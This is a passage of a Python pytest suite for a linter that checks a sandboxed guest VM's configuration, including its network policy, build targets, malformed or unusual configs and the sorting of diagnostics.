        assert _has_code(diags, "W010")

    def test_path_has_essentials_ok(self, guest_valid):
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W010")


# ---------------------------------------------------------------------------
# W011: Wide-open network policy
# ---------------------------------------------------------------------------


class TestW011:
    def test_fully_open_policy(self, guest_valid):
        (guest_valid / "config" / "security" / "web.toml").write_text(textwrap.dedent("""\
            [web]
            allow_read = true
            allow_write = true
            custom_allow = []
            custom_block = []

            [web.search.google]
            name = "Google"
            enabled = true
            domains = ["google.com"]
            allow_get = true

            [web.registry.pypi]
            name = "PyPI"
            enabled = true
            domains = ["pypi.org"]
            allow_get = true

            [web.repository.github]
            name = "GitHub"
            enabled = true
            domains = ["github.com"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W011")

    def test_read_only_not_flagged(self, guest_valid):
        """allow_read=true alone (no allow_write) is fine."""
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W011")

    def test_open_with_block_list_not_flagged(self, guest_valid):
        """allow_read+allow_write with a block list is intentional, no warning."""
        (guest_valid / "config" / "security" / "web.toml").write_text(textwrap.dedent("""\
            [web]
            allow_read = true
            allow_write = true
            custom_block = ["evil.com"]

            [web.search.google]
            name = "Google"
            enabled = true
            domains = ["google.com"]
            allow_get = true

            [web.registry.pypi]
            name = "PyPI"
            enabled = true
            domains = ["pypi.org"]
            allow_get = true

            [web.repository.github]
            name = "GitHub"
            enabled = true
            domains = ["github.com"]
            allow_get = true
        """))
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W011")


# ---------------------------------------------------------------------------
# W012: Unknown rust_target
# ---------------------------------------------------------------------------


class TestW012:
    def test_gnu_target(self, guest_valid):
        (guest_valid / "config" / "build.toml").write_text(textwrap.dedent("""\
            [build]
            compression = "zstd"

            [build.architectures.arm64]
            docker_platform = "linux/arm64"
            rust_target = "aarch64-unknown-linux-gnu"
            kernel_image = "arch/arm64/boot/Image"
            defconfig = "kernel/defconfig.arm64"
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "W012")

    def test_musl_target_ok(self, guest_valid):
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "W012")


# ---------------------------------------------------------------------------
# Real config validation (integration)
# ---------------------------------------------------------------------------


class TestRealConfig:
    def test_real_guest_config_no_errors(self):
        """The real guest/config/ should have zero errors."""
        guest_dir = PROJECT_ROOT / "guest"
        if not (guest_dir / "config" / "build.toml").exists():
            pytest.skip("No real guest config")
        diags = validate_guest(guest_dir)
        errors = _errors(diags)
        assert errors == [], f"Real config has errors: {errors}"


# ---------------------------------------------------------------------------
# Adversarial / complex scenarios
# ---------------------------------------------------------------------------


class TestAdversarial:
    def test_multiple_errors_at_once(self, guest_valid):
        """Config with several problems produces all relevant diagnostics."""
        # Bad domain + -dev package + no network
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=["https://bad.com"]))
        (guest_valid / "config" / "packages" / "python.toml").write_text(textwrap.dedent("""\
            [python]
            name = "Python"
            manager = "uv"
            install_cmd = "uv pip install"
            packages = ["libfoo-dev"]
        """))
        diags = validate_guest(guest_valid)
        assert _has_code(diags, "E006")
        assert _has_code(diags, "W002")
        assert _has_code(diags, "W004")

    def test_unicode_in_config_values(self, guest_valid):
        """Unicode in names/descriptions should not crash the linter."""
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=["*.googleapis.com"]).replace(
                'name = "Google"', 'name = "Google AI"'))
        diags = validate_guest(guest_valid)
        errors = _errors(diags)
        assert not errors

    def test_very_long_domain_list(self, guest_valid):
        """Large domain list should not crash."""
        domains = [f"sub{i}.example.com" for i in range(100)]
        (guest_valid / "config" / "ai" / "google.toml").write_text(
            _make_ai_toml("google", domains=domains))
        diags = validate_guest(guest_valid)
        assert not _has_code(diags, "E006")

    def test_many_providers(self, guest_valid):
        """Multiple providers each with files should all be checked."""
        for i in range(5):
            (guest_valid / "config" / "ai" / f"prov{i}.toml").write_text(
                _make_ai_toml(f"prov{i}", files={"cfg": {"path": f"/root/cfg{i}.json", "content": '{"ok": true}'}}))
        diags = validate_guest(guest_valid)
        errors = _errors(diags)
        assert not errors

    def test_empty_directories_ok(self, guest_valid):
        """Empty optional directories should not cause errors."""
        import shutil
        shutil.rmtree(guest_valid / "config" / "ai")
        (guest_valid / "config" / "ai").mkdir()
        shutil.rmtree(guest_valid / "config" / "mcp")
        (guest_valid / "config" / "mcp").mkdir()
        shutil.rmtree(guest_valid / "config" / "packages")
        (guest_valid / "config" / "packages").mkdir()
        diags = validate_guest(guest_valid)
        errors = _errors(diags)
        assert not errors


# ---------------------------------------------------------------------------
# Output formatting
# ---------------------------------------------------------------------------


class TestFormatting:
    def test_error_count_summary(self, guest_valid):
        diags = validate_guest(guest_valid)
        n_errors = len(_errors(diags))
        n_warnings = len(_warnings(diags))
        assert isinstance(n_errors, int)
        assert isinstance(n_warnings, int)

    def test_diagnostic_sortable(self):
        d1 = Diagnostic(code="W001", severity=Severity.WARNING, message="w", file="a")
        d2 = Diagnostic(code="E001", severity=Severity.ERROR, message="e", file="a")
        d3 = Diagnostic(code="E002", severity=Severity.ERROR, message="e2", file="b")
        result = sorted([d1, d2, d3], key=lambda d: (d.severity.value, d.code))
        assert result[0].code == "E001"
        assert result[1].code == "E002"
        assert result[2].code == "W001"
